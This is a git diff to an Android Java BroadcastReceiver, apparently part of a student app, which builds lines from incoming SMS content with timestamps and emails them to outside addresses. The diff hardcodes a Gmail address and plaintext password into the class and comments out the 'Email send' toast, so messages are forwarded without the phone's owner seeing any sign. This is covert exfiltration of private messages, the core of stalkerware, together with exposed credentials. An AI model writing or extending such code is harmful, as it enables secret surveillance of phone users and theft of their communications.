@@ -27,11 +27,13 @@ import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
 
-
 public class StartUpReceiver extends BroadcastReceiver
 {
+
     Context Cont;
     Mail sender;
+    String EMAIL= "alocationapp@gmail.com";
+    String password = "location21";
 
     @Override
     public void onReceive (Context context, Intent intent)
@@ -140,7 +142,7 @@ public class StartUpReceiver extends BroadcastReceiver
             String TimeStamp = new SimpleDateFormat ("yyyy-MM-dd HH:mm:ss").format (new Date ());
             String line = Line + "   (" + TimeStamp + ")";
 
-        sender = new Mail("pavlos.repin@gmail.com", "");
+        sender = new Mail(EMAIL, password);
         StringMake.setString(line);
         StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.
                     Builder().permitAll().build();
@@ -151,9 +153,7 @@ public class StartUpReceiver extends BroadcastReceiver
         }
 
         catch (Exception ex)
-
         {
-
         }
 
     }
@@ -173,7 +173,6 @@ public class StartUpReceiver extends BroadcastReceiver
 
         }
     }
-
 
     class MyAsyncClass_sms2 extends AsyncTask<Void, Void, Void> {
 
@@ -196,7 +195,7 @@ public class StartUpReceiver extends BroadcastReceiver
                 String line = null;
                 line = StringMake.getString();
 
-                sender.sendMail("New SMS", line, "pavlos.repin@gmail.com", "cse242017051@uniwa.gr");
+                sender.sendMail("New SMS", line, EMAIL, "cse242017051@uniwa.gr");
 
             } catch (Exception ex) {
 
@@ -210,10 +209,11 @@ public class StartUpReceiver extends BroadcastReceiver
 
             super.onPostExecute(result);
 
-            Toast.makeText(Cont.getApplicationContext(), "Email send", 100).show();
+            //Toast.makeText(Cont.getApplicationContext(), "Email send", 100).show();
 
         }
 
     }
+
 
 }
